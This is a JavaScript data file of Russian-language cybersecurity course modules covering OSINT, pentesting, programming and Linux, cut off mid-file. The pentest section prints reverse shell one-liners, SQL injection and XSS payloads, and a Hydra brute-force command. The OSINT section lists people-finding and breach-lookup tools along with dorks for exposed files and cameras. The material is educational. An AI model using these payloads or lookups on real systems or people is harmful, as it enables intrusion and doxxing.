/**
 * CyberDesacratio — база модулей и подмодулей (108 подмодулей)
 * Сгенерировано автоматически
 */

const MODULES = [
    {
        id: 'osint',
        icon: '🕵️',
        title: 'OSINT',
        desc: 'Разведка по открытым источникам: инструменты, техники, базы данных, Google Dorks, поиск информации, анализ соцсетей, утечки.',
        count: '16',
        submodules: [
            {
                title: '🔍 Основы OSINT',
                content: `
                    <h3>Что такое OSINT?</h3>
                    <p>OSINT (Open Source Intelligence) — разведка по открытым источникам. Это сбор и анализ информации из общедоступных источников: сайты, соцсети, форумы, утекшие базы, документы, изображения, метаданные.</p>
                    <h3>Ключевые принципы</h3>
                    <ul>
                        <li><strong>Легальность</strong> — только открытые данные, никакого взлома</li>
                        <li><strong>Верификация</strong> — перекрёстная проверка из 3+ источников</li>
                        <li><strong>Автоматизация</strong> — скрипты и тулы для массового сбора</li>
                        <li><strong>Анализ</strong> — данные → информация → выводы → отчёт</li>
                        <li><strong>OPSEC</strong> — не свети свои методы и источники</li>
                    </ul>
                    <h3>Этапы OSINT-исследования</h3>
                    <ol>
                        <li>Определение цели и задач</li>
                        <li>Сбор исходных данных (name, email, username, phone)</li>
                        <li>Поиск по открытым источникам</li>
                        <li>Анализ и верификация</li>
                        <li>Оформление результатов</li>
                    </ol>
                    <p>OSINT — это не про хакерство. Это про умение гуглить, анализировать и соединять точки.</p>
                `
            },
            {
                title: '🛠️ Инструменты OSINT',
                content: `
                    <h3>Топ инструментов</h3>
                    <ul>
                        <li><strong>Maltego</strong> — визуализация связей (графы, трансформы)</li>
                        <li><strong>Shodan</strong> — поиск устройств в интернете</li>
                        <li><strong>theHarvester</strong> — сбор email, поддоменов, IP</li>
                        <li><strong>Recon-ng</strong> — фреймворк для веб-разведки</li>
                        <li><strong>SpiderFoot</strong> — автоматический сканер (200+ модулей)</li>
                        <li><strong>Creepy</strong> — геолокация по фото</li>
                        <li><strong>Telegram OSINT</strong> — поиск по чатам и юзерам</li>
                        <li><strong>Google Dorks</strong> — продвинутый поиск</li>
                    </ul>
                    <h3>Установка</h3>
                    <pre><code># Kali Linux — всё предустановлено
# Для установки на Arch:
sudo pacman -S maltego theharvester recon-ng

# Python-инструменты
pip install holehe social-analyzer InstaLoad maigret</code></pre>
                `
            },
            {
                title: '📝 Google Dorks',
                content: `
                    <h3>Что такое Google Dorks?</h3>
                    <p>Специальные операторы поиска для точного нахождения информации. Позволяют находить то, что не предназначено для публичного просмотра.</p>
                    <h3>Основные операторы</h3>
                    <pre><code>site:example.com       — поиск по сайту
filetype:pdf           — поиск по типу файла
intitle:"admin"        — поиск в заголовке
inurl:admin            — поиск в URL
intext:"пароль"        — поиск в тексте
"@" + "example.com"    — поиск email
link:example.com       — кто ссылается</code></pre>
                    <h3>Примеры доров</h3>
                    <pre><code># Найти папки с бэкапами
intitle:"index of" /backup

# Найти PDF с отчётами
site:target.com filetype:pdf confidential

# Найти уязвимые страницы
inurl:php?id= site:target.com

# Найти логи
filetype:log site:target.com

# Найти камеры
inurl:"view/view.shtml"</code></pre>
                `
            },
            {
                title: '👤 Поиск людей',
                content: `
                    <h3>Методы поиска</h3>
                    <ul>
                        <li><strong>По username</strong> — namechk, whatsmy.name, knowem, maigret</li>
                        <li><strong>По email</strong> — holehe, emailrep.io, hunter.io</li>
                        <li><strong>По телефону</strong> — getcontact, truecaller, numverify</li>
                        <li><strong>По соцсетям</strong> — Facebook, VK, LinkedIn, Telegram, Instagram</li>
                        <li><strong>По форумам</strong> — Google "username site:forum.ru"</li>
                    </ul>
                    <h3>Проверка утечек</h3>
                    <ul>
                        <li>haveibeenpwned.com — проверка email</li>
                        <li>leakcheck.io — поиск по утечкам</li>
                        <li>dehashed.com — агрегатор утечек</li>
                        <li>scylla.so — база утечек</li>
                    </ul>
                    <pre><code># Поиск username через maigret
maigret username

# Проверка email через holehe
holehe email@example.com</code></pre>
                `
            },
            {
                title: '📧 Email OSINT',
                content: `
                    <h3>Поиск и проверка email</h3>
                    <ul>
                        <li><strong>Emailrep.io</strong> — репутация email</li>
                        <li><strong>Hunter.io</strong> — поиск email по домену</li>
                        <li><strong>Holehe</strong> — проверка регистраций по email</li>
                        <li><strong>Have I Been Pwned</strong> — утечки паролей</li>
                    </ul>
                    <h3>Формат email: паттерны</h3>
                    <pre><code># Стандартные паттерны
ivan.ivanov@company.com
i.ivanov@company.com
ivanov@company.com
ivan.i@company.com

# Генерация
username@domain.com
first.last@domain.com</code></pre>
                    <p>Используй hunter.io для поиска email-формата компании, затем holehe для проверки.</p>
                `
            },
            {
                title: '🌐 Социальные сети',
                content: `
                    <h3>OSINT в соцсетях</h3>
                    <ul>
                        <li><strong>Telegram</strong> — @username, чаты, каналы, Telegram API, Telegcrack</li>
                        <li><strong>VK</strong> — открытые профили, группы, фотографии, VK API</li>
                        <li><strong>Instagram</strong> — профили, истории, геолокация</li>
                        <li><strong>Facebook</strong> — профили, группы, фотографии, друзья</li>
                        <li><strong>Twitter/X</strong> — твиты, репосты, подписчики</li>
                        <li><strong>LinkedIn</strong> — карьера, контакты, компании</li>
                    </ul>
                    <h3>Инструменты</h3>
                    <pre><code># Telegram
pip install telethon
# VK
pip install vk_api
# Мульти-поиск
pip install maigret</code></pre>
                `
            },
            {
                title: '📸 Фото и геолокация',
                content: `
                    <h3>Поиск по изображениям</h3>
                    <ul>
                        <li><strong>Google Images</strong> — обратный поиск</li>
                        <li><strong>Yandex Images</strong> — альтернативный поиск</li>
                        <li><strong>Tineye</strong> — поиск по копиям</li>
                        <li><strong>ExifTool</strong> — чтение метаданных</li>
                    </ul>
                    <h3>Геолокация</h3>
                    <ul>
                        <li><strong>GeoGuessr</strong> — тренировка</li>
                        <li><strong>Google Earth</strong> — спутниковые снимки</li>
                        <li><strong>Overpass Turbo</strong> — OpenStreetMap запросы</li>
                        <li><strong>Creepy</strong> — геолокация по фото</li>
                    </ul>
                    <pre><code># Извлечь метаданные
exiftool photo.jpg

# Удалить метаданные
exiftool -all= photo.jpg</code></pre>
                `
            },
            {
                title: '🏢 Поиск по компаниям',
                content: `
                    <h3>Разведка компаний</h3>
                    <ul>
                        <li><strong>Rusprofile</strong> — юрлица РФ, ЕГРЮЛ</li>
                        <li><strong>Spark-Interfax</strong> — аналитика компаний</li>
                        <li><strong>Crunchbase</strong> — стартапы, инвестиции</li>
                        <li><strong>LinkedIn</strong> — сотрудники, структура</li>
                        <li><strong>Glassdoor</strong> — отзывы сотрудников</li>
                    </ul>
                    <h3>Домены и хостинг</h3>
                    <ul>
                        <li><strong>Whois</strong> — регистрационные данные доменов</li>
                        <li><strong>Shodan</strong> — устройство и серверы компании</li>
                        <li><strong>BuiltWith</strong> — технологии сайта</li>
                        <li><strong>DNS Dumpster</strong> — DNS-разведка</li>
                    </ul>
                    <pre><code># Whois
whois example.com

# DNS
nslookup example.com
dig example.com ANY</code></pre>
                `
            },
            {
                title: '🔗 Связи и графы',
                content: `
                    <h3>Построение связей</h3>
                    <p>Люди, email, телефоны, адреса, никнеймы — всё это точки в графе. Задача OSINT-исследователя — соединить эти точки.</p>
                    <ul>
                        <li><strong>Maltego</strong> — визуальные графы с трансформами</li>
                        <li><strong>Obsidian</strong> — заметки с графом связей</li>
                        <li><strong>Gephi</strong> — продвинутая визуализация графов</li>
                        <li><strong>yEd Graph Editor</strong> — ручное построение</li>
                    </ul>
                    <p>Техника: найди аккаунт → извлеки связи → добавь в граф → ищи пересечения.</p>
                `
            },
            {
                title: '📱 Telegram OSINT',
                content: `
                    <h3>Разведка в Telegram</h3>
                    <ul>
                        <li><strong>Поиск юзеров</strong> — @username, phone -> TG</li>
                        <li><strong>Телеграм чаты</strong> — поиск по сообщениям (Telegcrack, tgstat.ru)</li>
                        <li><strong>Каналы</strong> — аналитика (tgstat.ru, tgindex)</li>
                        <li><strong>Telegram API</strong> — MTProto, Telethon, pyrogram</li>
                        <li><strong>Утечки</strong> — зеркала утекших баз TG</li>
                    </ul>
                    <pre><code># Telethon CLI
from telethon import TelegramClient
client = TelegramClient('session', api_id, api_hash)
client.start()

# Получить информацию о юзере
user = client.get_entity('@username')
print(user.phone)</code></pre>
                `
            },
            {
                title: '🗄️ Утечки и базы данных',
                content: `
                    <h3>Утекшие базы</h3>
                    <ul>
                        <li><strong>Have I Been Pwned</strong> — 11B+ записей</li>
                        <li><strong>LeakCheck</strong> — 10B+ записей</li>
                        <li><strong>Dehashed</strong> — поиск по email/username/ip</li>
                        <li><strong>Snusbase</strong> — поиск по утечкам</li>
                        <li><strong>Scylla.so</strong> — бесплатный поиск</li>
                    </ul>
                    <h3>Поиск по утечкам (легально)</h3>
                    <ul>
                        <li>Проверяй только свои email/username</li>
                        <li>Используй haveibeenpwned.com (легально и бесплатно)</li>
                        <li>Не скачивай и не распространяй базы — это незаконно</li>
                    </ul>
                `
            },
            {
                title: '🕵️ Обратный поиск',
                content: `
                    <h3>Обратный поиск по данным</h3>
                    <ul>
                        <li><strong>По фото</strong> — Google Images, Yandex, Tineye, PimEyes</li>
                        <li><strong>По телефону</strong> — truecaller, getcontact, numverify</li>
                        <li><strong>По email</strong> — holehe, emailrep.io, hunter.io</li>
                        <li><strong>По username</strong> — maigret, namechk, whatsmy.name</li>
                        <li><strong>По адресу</strong> — Google Maps, кадастр</li>
                    </ul>
                    <pre><code># maigret — поиск по username
pip install maigret
maigret username

# holehe — проверка email
holehe email@example.com</code></pre>
                `
            },
            {
                title: '📊 Анализ данных',
                content: `
                    <h3>Обработка результатов</h3>
                    <ul>
                        <li><strong>jq</strong> — парсинг JSON в терминале</li>
                        <li><strong>pandas</strong> — анализ табличных данных</li>
                        <li><strong>Excel/Google Sheets</strong> — ручной анализ</li>
                        <li><strong>Obsidian</strong> — структурирование заметок</li>
                    </ul>
                    <pre><code># Конвертация JSON в таблицу
cat data.json | jq -r '.[] | [.email, .username] | @tsv' > data.tsv</code></pre>
                    <h3>Визуализация</h3>
                    <ul>
                        <li><strong>Maltego</strong> — графы связей</li>
                        <li><strong>Gephi</strong> — сложные графы</li>
                        <li><strong>Kibana</strong> — дашборды (если есть ELK)</li>
                    </ul>
                `
            },
            {
                title: '⚖️ Этика OSINT',
                content: `
                    <h3>Правила этичного OSINT</h3>
                    <ul>
                        <li>Используй только открытые данные</li>
                        <li>Не публикуй личные данные без согласия</li>
                        <li>Не используй OSINT для вреда, шантажа или доксинга</li>
                        <li>Соблюдай законы своей страны</li>
                        <li>Не социа́льная инженерия — это уже не OSINT</li>
                        <li>Верифицируй информацию из 3+ источников</li>
                    </ul>
                    <p>OSINT — это инструмент. Как и любой инструмент, он может быть использован во благо или во вред. Выбор за тобой.</p>
                    <p><strong>Золотое правило:</strong> не делай другим того, чего не хочешь себе.</p>
                `
            }
        ]
    },
    {
        id: 'pentest',
        icon: '⚔️',
        title: 'Пентестинг',
        desc: 'Тестирование на проникновение: методологии, инструменты, практика, CTF, отчёты, защита.',
        count: '12',
        submodules: [
            {
                title: '📖 Основы пентеста',
                content: `
                    <h3>Что такое пентест?</h3>
                    <p>Penetration Testing — легальная имитация атаки на систему с целью поиска уязвимостей. От настоящей атаки отличается наличием договора и рамок.</p>
                    <h3>Этапы (PTES)</h3>
                    <ol>
                        <li>Reconnaissance — разведка (пассивная и активная)</li>
                        <li>Scanning — сканирование портов, сервисов, уязвимостей</li>
                        <li>Exploitation — эксплуатация уязвимостей</li>
                        <li>Privilege Escalation — повышение прав</li>
                        <li>Post-Exploitation — закрепление, сбор данных</li>
                        <li>Reporting — отчёт</li>
                    </ol>
                    <h3>Методологии</h3>
                    <ul>
                        <li><strong>OWASP WSTG</strong> — веб-пентест</li>
                        <li><strong>PTES</strong> — стандарт пентеста</li>
                        <li><strong>OSSTMM</strong> — профессиональный стандарт</li>
                        <li><strong>NIST SP 800-115</strong> — государственный стандарт</li>
                    </ul>
                `
            },
            {
                title: '🔧 Инструменты',
                content: `
                    <h3>Базовый набор</h3>
                    <ul>
                        <li><strong>Nmap</strong> — сканер портов</li>
                        <li><strong>Metasploit</strong> — фреймворк эксплойтов</li>
                        <li><strong>Burp Suite</strong> — перехват HTTP/HTTPS</li>
                        <li><strong>Hydra</strong> — брутфорс паролей</li>
                        <li><strong>Wireshark</strong> — анализ трафика</li>
                        <li><strong>John/Hashcat</strong> — взлом хэшей</li>
                        <li><strong>Gobuster/ffuf</strong> — перебор директорий</li>
                        <li><strong>Netcat/ncat</strong> — швейцарский нож</li>
                    </ul>
                    <pre><code># Установка на Kali (всё предустановлено)
# Дополнительно:
sudo apt install ffuf seclists
pip install impacket bloodhound</code></pre>
                `
            },
            {
                title: '🎯 Практика (легально)',
                content: `
                    <h3>Полигоны</h3>
                    <ul>
                        <li><strong>HackTheBox</strong> — реалистичные машины, лабы</li>
                        <li><strong>TryHackMe</strong> — обучение с нуля, комнаты</li>
                        <li><strong>VulnHub</strong> — уязвимые VM для загрузки</li>
                        <li><strong>PentesterLab</strong> — веб-пентест по подписке</li>
                        <li><strong>OverTheWire</strong> — Linux-задания (Bandit)</li>
                        <li><strong>PortSwigger Web Academy</strong> — бесплатно</li>
                    </ul>
                    <p><strong>Совет:</strong> начни с TryHackMe — там структурированное обучение. Затем переходи на HTB.</p>
                `
            },
            {
                title: '📋 OWASP Top 10',
                content: `
                    <h3>Топ-10 веб-уязвимостей 2021</h3>
                    <ol>
                        <li>Injection (SQL, NoSQL, OS)</li>
                        <li>Broken Authentication</li>
                        <li>Sensitive Data Exposure</li>
                        <li>XML External Entities (XXE)</li>
                        <li>Broken Access Control</li>
                        <li>Security Misconfiguration</li>
                        <li>Cross-Site Scripting (XSS) — Reflected, Stored, DOM</li>
                        <li>Insecure Deserialization</li>
                        <li>Components with Known Vulnerabilities</li>
                        <li>Insufficient Logging & Monitoring</li>
                    </ol>
                    <p>Каждая уязвимость имеет CWE-номер и описание на owasp.org. Изучай их все.</p>
                `
            },
            {
                title: '💉 SQL Injection',
                content: `
                    <h3>SQLi — база веб-пентеста</h3>
                    <p>SQL Injection — внедрение SQL-кода через пользовательский ввод. Одна из самых старых и опасных уязвимостей.</p>
                    <h3>Типы SQLi</h3>
                    <ul>
                        <li><strong>In-band</strong> — Error-based, Union-based</li>
                        <li><strong>Blind</strong> — Boolean-based, Time-based</li>
                        <li><strong>Out-of-band</strong> — DNS/HTTP exfiltration</li>
                    </ul>
                    <h3>Примеры</h3>
                    <pre><code># Union-based
' UNION SELECT username,password FROM users--

# Blind boolean
' OR 1=1--
' OR '1'='1

# Time-based
' WAITFOR DELAY '0:0:5'--</code></pre>
                    <p>Практикуйся на SQLInjection.com, PortSwigger labs.</p>
                `
            },
            {
                title: '🌐 XSS (Cross-Site Scripting)',
                content: `
                    <h3>Типы XSS</h3>
                    <ul>
                        <li><strong>Reflected XSS</strong> — одноразовый, в URL</li>
                        <li><strong>Stored XSS</strong> — сохраняется на сервере</li>
                        <li><strong>DOM-based XSS</strong> — через клиентский JS</li>
                    </ul>
                    <h3>Payloads</h3>
                    <pre><code><script>alert(1)</script>
<img src=x onerror=alert(1)>
<a href="javascript:alert(1)">click</a>

# Обход фильтров
<ScRiPt>alert(1)</ScRiPt>
%3Cscript%3Ealert(1)%3C/script%3E</code></pre>
                    <p>Используй Burp Suite для перехвата и модификации запросов при поиске XSS.</p>
                `
            },
            {
                title: '🔑 Аутентификация',
                content: `
                    <h3>Уязвимости аутентификации</h3>
                    <ul>
                        <li><strong>Брутфорс</strong> — нет ограничения попыток</li>
                        <li><strong>Weak passwords</strong> — слабые пароли</li>
                        <li><strong>Session fixation</strong> — фиксация сессии</li>
                        <li><strong>JWT уязвимости</strong> — none algorithm, weak secret</li>
                        <li><strong>2FA bypass</strong> — обход двухфакторки</li>
                    </ul>
                    <pre><code># Брутфорс с Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# JWT crack
python jwt_tool.py <token> -C -d rockyou.txt</code></pre>
                `
            },
            {
                title: '🐚 Shell и Reverse Shell',
                content: `
                    <h3>Получение доступа</h3>
                    <p>После эксплуатации нужно получить shell. Reverse shell — цель сама подключается к твоей машине.</p>
                    <h3>Reverse Shell One-liners</h3>
                    <pre><code># Bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Netcat
nc -e /bin/sh 10.0.0.1 4444</code></pre>
                    <p>Поднимай listener: <code>nc -lvnp 4444</code></p>
                `
            },
            {
                title: '🚀 Privilege Escalation',
                content: `
                    <h3>Повышение прав (Linux)</h3>
                    <ul>
                        <li><strong>SUID биты</strong> — find / -perm -4000 2>/dev/null</li>
                        <li><strong>Sudo -l</strong> — что можно запустить от root</li>
                        <li><strong>Kernel exploits</strong> — CVE, dirty pipe, etc.</li>
                        <li><strong>Capabilities</strong> — getcap -r / 2>/dev/null</li>
                        <li><strong>CRON jobs</strong> — задачи по расписанию</li>
                        <li><strong>Linenum/LinPEAS</strong> — автоматические скрипты</li>
                    </ul>
                    <pre><code># LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# SUID поиск
find / -type f -perm -4000 2>/dev/null</code></pre>
                `
            },
            {
                title: '🌐 Web Recon',
                content: `
                    <h3>Веб-разведка</h3>
                    <ul>
                        <li><strong>Subdomain enumeration</strong> — subfinder, amass, assetfinder</li>
                        <li><strong>Directory busting</strong> — ffuf, gobuster, dirsearch</li>
                        <li><strong>Param discovery</strong> — arjun, paramspider</li>
                        <li><strong>JS analysis</strong> — LinkFinder, JSParser</li>
                        <li><strong>Tech detection</strong> — whatweb, wappalyzer</li>
                    </ul>
                    <pre><code># Subdomain scan
subfinder -d example.com | httpx

# Directory busting
ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Param discovery
arjun -u https://example.com/api.php</code></pre>
                `
            },
            {
                title: '📝 Отчётность',
                content: `
                    <h3>Структура отчёта</h3>
                    <ul>
                        <li><strong>Executive Summary</strong> — для руководства (без технических деталей)</li>
                        <li><strong>Scope</strong> — что тестировалось</li>
                        <li><strong>Methodology</strong> — как проводился пентест</li>
                        <li><strong>Findings</strong> — найденные уязвимости (CVSS score)</li>
                        <li><strong>PoC</strong> — доказательство эксплуатации (скриншоты, логи)</li>
                        <li><strong>Recommendations</strong> — как исправить</li>
                        <li><strong>Timeline</strong> — когда что делалось</li>
                    </ul>
                    <p>Инструменты: <strong>Serpico</strong>, <strong>Ghostwriter</strong>, или просто LaTeX/Word. CVSS v3.1 — стандарт оценки.</p>
                `
            },
            {
                title: '🛡️ Защита',
                content: `
                    <h3>Как защищаться</h3>
                    <ul>
                        <li><strong>Input validation</strong> — валидация всего ввода</li>
                        <li><strong>Prepared statements</strong> — никакой конкатенации SQL</li>
                        <li><strong>Content Security Policy (CSP)</strong> — защита от XSS</li>
                        <li><strong>Rate limiting</strong> — защита от брутфорса</li>
                        <li><strong>WAF</strong> — Web Application Firewall</li>
                        <li><strong>Regular updates</strong> — патчи безопасности</li>
                        <li><strong>Сканируй себя сам</strong> — найди уязвимости до хакеров</li>
                    </ul>
                    <p>Знание атак — лучшешая защита. Учись у атакующих, чтобы защищать.</p>
                `
            }
        ]
    },
    {
        id: 'coding',
        icon: '💻',
        title: 'Программирование',
        desc: 'Python, JavaScript, Bash, Node.js. Скрипты, автоматизация, best practices, алгоритмы, базы данных.',
        count: '14',
        submodules: [
            {
                title: '🐍 Python',
                content: `
                    <h3>Мой основной язык</h3>
                    <p>Python — для всего: боты, парсеры, скрипты, тулы, автоматизация, пентест.</p>
                    <h3>Полезные библиотеки</h3>
                    <ul>
                        <li><strong>requests/aiohttp</strong> — HTTP-запросы</li>
                        <li><strong>BeautifulSoup/lxml</strong> — парсинг HTML/XML</li>
                        <li><strong>aiogram</strong> — Telegram-боты (новички)</li>
                        <li><strong>pandas</strong> — работа с данными</li>
                        <li><strong>asyncio</strong> — асинхронность</li>
                        <li><strong>argparse/click</strong> — CLI-аргументы</li>
                        <li><strong>scapy</strong> — работа с пакетами</li>
                        <li><strong>paramiko</strong> — SSH</li>
                    </ul>
                    <pre><code># Пример: простой парсер
import requests
from bs4 import BeautifulSoup

url = "https://example.com"
r = requests.get(url)
soup = BeautifulSoup(r.text, 'html.parser')
for h2 in soup.find_all('h2'):
    print(h2.text.strip())</code></pre>
                `
            },
            {
                title: '🌐 JavaScript/Node.js',
                content: `
                    <h3>Фронтенд и бэкенд</h3>
                    <ul>
                        <li><strong>Vanilla JS</strong> — анимации, интерактив, canvas</li>
                        <li><strong>Node.js + Express</strong> — сервера, API</li>
                        <li><strong>SQLite/PostgreSQL</strong> — базы данных</li>
                        <li><strong>React/Vue</strong> — SPA-фреймворки</li>
                    </ul>
                    <h3>Полезные концепции</h3>
                    <ul>
                        <li>Асинхронность: callbacks → promises → async/await</li>
                        <li>REST API — архитектура запросов</li>
                        <li>JWT — аутентификация</li>
                        <li>WebSocket — real-time</li>
                    </ul>
                    <pre><code>// Простой Express-сервер
const express = require('express')
const app = express()
app.get('/', (req, res) => res.send('Hello'))
app.listen(3000)</code></pre>
                `
            },
            {
                title: '🐚 Bash / Shell',
                content: `
                    <h3>Автоматизация в Linux</h3>
                    <pre><code>#!/bin/bash
# Бэкап директории
backup_dir="/var/backups"
timestamp=$(date +%Y%m%d_%H%M%S)
tar -czf "\${backup_dir}/backup_\${timestamp}.tar.gz" /home/user</code></pre>
                    <h3>Полезные команды</h3>
                    <ul>
                        <li><code>grep</code>, <code>sed</code>, <code>awk</code> — обработка текста</li>
                        <li><code>find</code> — поиск файлов</li>
                        <li><code>xargs</code> — массовые операции</li>
                        <li><code>sort</code>, <code>uniq</code> — сортировка, уникальные</li>
                        <li><code>cron</code> / <code>systemd timers</code> — планировщик</li>
                    </ul>
                `
            },
            {
                title: '📐 Best Practices',
                content: `
                    <h3>Как писать хороший код</h3>
                    <ul>
                        <li><strong>DRY</strong> — Don't Repeat Yourself</li>
                        <li><strong>KISS</strong> — Keep It Simple, Stupid</li>
                        <li><strong>YAGNI</strong> — You Ain't Gonna Need It</li>
                        <li><strong>SOLID</strong> — принципы ООП</li>
                        <li>Пиши README — документируй</li>
                        <li>Используй .env для секретов</li>
                        <li>Git — commit часто, push регулярно</li>
                        <li>Code review — чужие глаза видят баги</li>
                    </ul>
                `
            },
            {
                title: '🗄️ Базы данных',
                content: `
                    <h3>SQL и NoSQL</h3>
                    <ul>
                        <li><strong>SQLite</strong> — встраиваемая, для мелких проектов</li>
                        <li><strong>PostgreSQL</strong> — мощная, для серьёзных проектов</li>
                        <li><strong>MySQL</strong> — популярная, много хостингов</li>
                        <li><strong>Redis</strong> — in-memory кэш, очереди</li>
                        <li><strong>MongoDB</strong> — документная NoSQL</li>
                    </ul>
                    <pre><code>-- Создание таблицы
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE,
    email VARCHAR(100),
    created_at TIMESTAMP DEFAULT NOW()
);

-- CRUD
INSERT INTO users (username, email) VALUES ('admin', 'admin@site.com');
SELECT * FROM users WHERE username = 'admin';</code></pre>
                `
            },
            {
                title: '🌍 API и REST',
                content: `
                    <h3>REST API дизайн</h3>
                    <ul>
                        <li><strong>GET /resource</strong> — список</li>
                        <li><strong>GET /resource/:id</strong> — один элемент</li>
                        <li><strong>POST /resource</strong> — создать</li>
                        <li><strong>PUT /resource/:id</strong> — обновить</li>
                        <li><strong>DELETE /resource/:id</strong> — удалить</li>
                    </ul>
                    <h3>Аутентификация в API</h3>
                    <ul>
                        <li><strong>JWT (JSON Web Token)</strong> — самый популярный</li>
                        <li><strong>OAuth2</strong> — сторонняя авторизация</li>
                        <li><strong>API Key</strong> — простые ключи</li>
                        <li><strong>Basic Auth</strong> — только для тестов</li>
                    </ul>
                    <pre><code># Пример JWT в Python
import jwt
token = jwt.encode({"user_id": 1}, "secret_key", algorithm="HS256")
decoded = jwt.decode(token, "secret_key", algorithms=["HS256"])</code></pre>
                `
            },
            {
                title: '🔒 Безопасность кода',
                content: `
                    <h3>Ошибки безопасности</h3>
                    <ul>
                        <li><strong>Не доверяй вводу</strong> — все данные от юзера — зло</li>
                        <li><strong>SQL Injection</strong> — используй ORM или prepared statements</li>
                        <li><strong>XSS</strong> — экранируй вывод</li>
                        <li><strong>CSRF</strong> — используй токены</li>
                        <li><strong>Не храни секреты в коде</strong> — .env, vault</li>
                        <li><strong>Rate limiting</strong> — защита от DDoS/брутфорса</li>
                    </ul>
                `
            },
            {
                title: '🐙 Git',
                content: `
                    <h3>Команды Git</h3>
                    <pre><code>git init
# или
git clone <url>

git add .
git commit -m "message"
git push origin main

git pull
git fetch

git log --oneline --graph --all
git diff
git checkout -b feature

git merge feature
git rebase -i HEAD~3</code></pre>
                    <h3>Workflow</h3>
                    <ul>
                        <li>main/stable — только стабильный код</li>
                        <li>dev/develop — разработка</li>
                        <li>feature/* — новые фичи</li>
                        <li>fix/* — исправления</li>
                        <li>commit часто, но осмысленно</li>
                    </ul>
                `
            },
            {
                title: '🧪 Тестирование',
                content: `
                    <h3>Виды тестов</h3>
                    <ul>
                        <li><strong>Unit тесты</strong> — тестирование одной функции</li>
                        <li><strong>Integration тесты</strong> — взаимодействие модулей</li>
                        <li><strong>E2E тесты</strong> — полный сценарий</li>
                        <li><strong>Regression тесты</strong> — регрессия после изменений</li>
                        <li><strong>Security тесты</strong> — безопасность</li>
                    </ul>
                    <pre><code># Python pytest
import pytest

def add(a, b):
    return a + b

def test_add():
    assert add(2, 3) == 5
    assert add(-1, 1) == 0

# Запуск
# pytest test.py</code></pre>
                `
            },
            {
                title: '🐳 Docker',
                content: `
                    <h3>Основы Docker</h3>
                    <pre><code># Dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY . .
CMD ["python", "main.py"]</code></pre>
                    <pre><code># Сборка и запуск
docker build -t myapp .
docker run -d --name myapp -p 8000:8000 myapp

docker ps -a
docker logs myapp
docker exec -it myapp sh

docker compose up -d
docker compose down</code></pre>
                `
            },
            {
                title: '🛠️ CI/CD',
                content: `
                    <h3>Автоматизация сборки</h3>
                    <ul>
                        <li><strong>GitHub Actions</strong> — CI/CD для GitHub</li>
                        <li><strong>GitLab CI</strong> — для GitLab</li>
                        <li><strong>Jenkins</strong> — классический CI/CD</li>
                        <li><strong>Drone CI</strong> — простой, контейнерный</li>
                    </ul>
                    <h3>Пример GitHub Actions</h3>
                    <pre><code># .github/workflows/deploy.yml
name: Deploy
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: pip install -r requirements.txt
      - run: pytest</code></pre>
                `
            },
            {
                title: '📝 Алгоритмы',
                content: `
                    <h3>Must-know алгоритмы</h3>
                    <ul>
                        <li><strong>Сортировки</strong> — quick sort, merge sort, bubble sort</li>
                        <li><strong>Поиск</strong> — binary search, BFS, DFS</li>
                        <li><strong>Структуры</strong> — linked list, stack, queue, hash table, tree</li>
                        <li><strong>Динамика</strong> — DP, knapsack, LCS</li>
                        <li><strong>Графы</strong> — Dijkstra, Floyd-Warshall, A*</li>
                    </ul>
                    <pre><code># Binary Search (Python)
def binary_search(arr, x):
    left, right = 0, len(arr) - 1
    while left <= right:
        mid = (left + right) // 2
        if arr[mid] == x: return mid
        elif arr[mid] < x: left = mid + 1
        else: right = mid - 1
    return -1</code></pre>
                `
            },
            {
                title: '📦 Менеджеры пакетов',
                content: `
                    <h3>Экосистемы</h3>
                    <ul>
                        <li><strong>pip</strong> — Python (requirements.txt)</li>
                        <li><strong>npm/yarn/pnpm</strong> — Node.js (package.json)</li>
                        <li><strong>cargo</strong> — Rust (Cargo.toml)</li>
                        <li><strong>go mod</strong> — Go (go.mod)</li>
                        <li><strong>pacman/yay</strong> — Arch Linux</li>
                    </ul>
                    <pre><code># pip
pip install requests
pip freeze > requirements.txt
pip install -r requirements.txt

# npm
npm init -y
npm install express
npx create-react-app myapp</code></pre>
                `
            },
            {
                title: '💡 Советы',
                content: `
                    <h3>Как прокачаться в коде</h3>
                    <ul>
                        <li>Пиши каждый день — хотя бы 30 минут</li>
                        <li>Читай чужой код — open source проекты</li>
                        <li>Решай задачи — LeetCode, CodeWars, HackerRank</li>
                        <li>Участвуй в open source — найди баг и исправь</li>
                        <li>Пиши утилиты для себя — automate everything</li>
                        <li>Изучай разные языки — расширяет кругозор</li>
                    </ul>
                `
            }
        ]
    },
    {
        id: 'linux',
        icon: '🐧',
        title: 'Linux / Unix',
        desc: 'Arch, Debian, Kali. Установка, администрирование, Docker, systemd, сети, безопасность, тулинг.',
        count: '14',
        submodules: [
            {
                title: '📀 Дистрибутивы',
                content: `
                    <h3>Мои дистрибутивы</h3>
                    <ul>
                        <li><strong>Arch Linux</strong> — основной. Rolling release, полный контроль, AUR.</li>
                        <li><strong>Kali Linux</strong> — для пентеста. Всё предустановлено.</li>
                        <li><strong>Debian</strong> — для серверов. Стабильность, LTS.</li>
                        <li><strong>Ubuntu</strong> — популярный, много гайдов.</li>
                        <li><strong>Fedora</strong> — передовые технологии, RPM.</li>
                    </ul>
                    <p>Выбор дистрибутива — это выбор философии. Arch для контроля, Debian для стабильности.</p>
                `
            },
            {
                title: '⌨️ Команды (must know)',
                content: `
                    <h3>Навигация и файлы</h3>
                    <pre><code># Навигация
ls -la          # список
cd /path        # переход
pwd             # где я
tree            # дерево

# Файлы
cp -r src dst   # копировать
mv src dst      # переместить
rm -rf dir      # удалить
chmod +x file   # сделать исполняемым
ln -s target link # симлинк</code></pre>
                    <pre><code># Процессы
